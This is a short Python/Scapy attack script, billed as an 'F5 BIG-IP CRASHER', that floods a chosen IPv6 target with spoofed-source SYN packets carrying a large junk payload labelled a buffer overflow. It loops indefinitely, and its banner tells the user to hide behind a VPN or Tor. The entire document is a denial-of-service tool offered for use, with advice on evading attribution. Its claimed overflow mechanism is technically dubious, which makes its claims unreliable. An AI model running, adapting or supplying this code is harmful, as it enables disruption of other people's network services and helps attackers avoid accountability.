#!/usr/bin/env python3
from scapy.all import *
import time
import random
import sys

# --- TARGET (MODIFY THIS) ---
TARGET_IPV6 = "2001:db8::1"  # Replace with your target's IPv6 address
TARGET_PORT = 443           # Target port (443 for HTTPS)

# --- PAYLOAD: Pure Buffer Overflow (DoS) ---
PAYLOAD = (
    b"\x41" * 60000        # 60k of 'A' to flood memory
    + b"\x00\x00\x00\x00"  # Pointer corruption
    + b"\xFF" * 5000       # Random data to break things
)

# --- Generate a random IPv6 source address ---
def random_ipv6():
    return ":".join(f"{random.randint(0, 0xffff):04x}" for _ in range(8))

# --- Craft the malicious IPv6 packet ---
def craft_packet():
    ipv6 = IPv6(
        src=random_ipv6(),  # Random spoofed IPv6 source
        dst=TARGET_IPV6,
    )
    tcp = TCP(
        sport=random.randint(1024, 65535),
        dport=TARGET_PORT,
        flags="S",  # SYN flag to trigger the bug
    )
    return ipv6 / tcp / PAYLOAD

# --- Send the malicious packet ---
def send_exploit():
    packet = craft_packet()
    print(f"[FIVEGHOST] 💥 Sending malicious IPv6 packet to {TARGET_IPV6} (Source IP: {packet[IPv6].src})...")
    send(packet, verbose=0)

# --- Attack loop (Continuous DoS) ---
if __name__ == "__main__":
    print(f"""
    ───────────────────────────────────────────────────────────────────────────────
     F5 BIG-IP CRASHER (IPv6) - CORRECTED VERSION
     Target: {TARGET_IPV6}
     Port: {TARGET_PORT}
     Payload: Pure Buffer Overflow (DoS)
    ───────────────────────────────────────────────────────────────────────────────
    ⚠️  This script will crash the F5 BIG-IP service in a loop via IPv6.
    ⚠️  Use a VPN/Tor to mask your IP.
    """)
    try:
        while True:
            send_exploit()
            time.sleep(0.1)  # Short delay to avoid flooding your own machine
    except KeyboardInterrupt:
        print("\n[F5] 🛑 Attack stopped by user.")
        sys.exit(0)
